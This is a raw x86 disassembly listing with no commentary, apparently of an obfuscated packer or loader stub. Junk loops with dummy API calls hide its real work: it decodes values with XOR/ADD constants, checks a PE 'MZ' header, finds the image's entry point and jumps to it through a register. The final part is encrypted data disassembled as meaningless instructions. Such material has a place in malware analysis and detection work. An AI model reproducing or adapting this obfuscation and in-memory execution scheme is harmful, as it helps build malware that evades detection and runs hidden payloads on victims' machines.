  409de7:	mov    DWORD PTR ds:0x4235bf,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4235cb,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4235c7,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4235db,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4235db
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4235d3,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4235cf,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4235d7,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4235c7,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4235bf,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4235c7,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4235d3,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4235bf,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	pop    esp
  40a7b5:	mov    ds:0x25053008,al
  40a7ba:	jle    0x40a83a
  40a7bc:	lds    edi,FWORD PTR [edi+0x7e]
  40a7bf:	jle    0x40a783
  40a7c1:	fwait
  40a7c2:	dec    ebp
  40a7c3:	sub    al,0x23
  40a7c5:	sbb    al,0xd0
  40a7c7:	push   ecx
  40a7c8:	div    eax
  40a7ca:	pop    ds
  40a7cb:	int3   
  40a7cc:	test   al,0x31
  40a7ce:	xchg   DWORD PTR [edx+0x2],ebp
  40a7d1:	cmp    al,0x67
  40a7d3:	mov    ds:0x516112e1,eax
  40a7d8:	dec    ebx
  40a7d9:	and    cl,ah
  40a7db:	imul   DWORD PTR [edx+0x33]
  40a7de:	js     0x40a811
  40a7e0:	out    dx,eax
  40a7e1:	mov    edx,0x21c58387
  40a7e6:	and    al,0x81
  40a7e8:	pop    edi
  40a7e9:	xor    BYTE PTR [edi-0x2e],bh
  40a7ec:	sbb    BYTE PTR [esi+eiz*4-0x32c5e2ab],cl
  40a7f3:	cmp    DWORD PTR [eax+ebp*4-0x12],0xffffffa4
  40a7f8:	xchg   esp,eax
  40a7f9:	pop    ss
  40a7fa:	stos   BYTE PTR es:[edi],al
  40a7fb:	mov    bh,0x45
  40a7fd:	pushf  
  40a7fe:	cld    
  40a7ff:	loop   0x40a86f
  40a801:	ds (bad) 
  40a803:	and    eax,0xf9a4f5b2
  40a808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a809:	mov    al,0xc
  40a80b:	dec    ecx
  40a80c:	call   0x28ff:0xe69a3323
  40a813:	inc    edx
  40a814:	mov    ds:0x4d4dbe8,eax
  40a819:	scas   eax,DWORD PTR es:[edi]
  40a81a:	jmp    0x40a844
  40a81c:	shl    DWORD PTR [ebp+0x45],0xce
  40a820:	jmp    0x75e:0x2a14d520
  40a827:	push   ebx
  40a828:	test   eax,0x53d696aa
  40a82d:	or     ch,cl
  40a82f:	push   esi
  40a830:	cmp    al,ah
  40a832:	ss dec esi
  40a834:	fadd   st,st(2)
  40a836:	push   esi
  40a837:	push   esi
  40a838:	inc    eax
  40a839:	ins    DWORD PTR es:[edi],dx
  40a83a:	mov    BYTE PTR [eax],cl
  40a83c:	es aas 
  40a83e:	rcr    BYTE PTR [ebx-0x10],1
  40a841:	push   ebp
  40a842:	(bad)  
  40a843:	imul   ecx,DWORD PTR [esi+edi*1+0x38],0xf
  40a848:	ffree  st(3)
  40a84a:	fcomp  DWORD PTR [edi]
  40a84c:	xor    BYTE PTR [ecx],dh
